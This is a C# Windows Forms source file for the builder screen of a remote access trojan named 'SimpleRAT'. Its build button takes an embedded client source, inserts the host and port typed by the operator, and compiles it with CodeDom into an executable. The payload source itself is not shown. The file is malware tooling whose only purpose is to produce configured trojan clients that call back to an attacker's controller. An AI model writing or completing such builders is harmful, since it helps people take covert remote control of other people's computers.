using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace SimpleRAT
{
    public partial class frmBuild : Form
    {
        public frmBuild()
        {
            InitializeComponent();
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.Filter = "Executables | *.exe";
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                string Source = Properties.Resources.Source; 
                string ClientSettings = Properties.Resources.ClientSettings; 
                Source = Source.Replace("[IP]", txtHost.Text);
                Source = Source.Replace("[PORT]", txtPort.Text);
                CodeDom.Compile(sfd.FileName, Source, ClientSettings);
                MessageBox.Show("Compiled successfully at: " + sfd.FileName);
            }
            
        }

        private void frmBuild_Load(object sender, EventArgs e)
        {

        }
    }
}
